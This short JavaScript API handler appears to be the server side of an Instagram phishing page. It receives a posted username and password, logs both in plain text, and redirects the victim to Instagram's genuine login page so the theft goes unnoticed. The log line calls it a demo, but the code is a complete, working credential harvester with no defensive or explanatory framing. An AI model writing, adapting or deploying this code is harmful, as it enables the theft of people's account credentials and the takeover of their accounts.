export default function handler(req, res) {
  if (req.method === 'POST') {
 
    const { username, password } = req.body;

    
    console.log(`Demo login attempt - Username: ${username}, Password: ${password}`);

    
    res.writeHead(302, { Location: 'https://www.instagram.com/accounts/login/?hl=en' }); 
    res.end();
  } else {
    res.status(200).send('This endpoint accepts POST requests only.');
  }
}
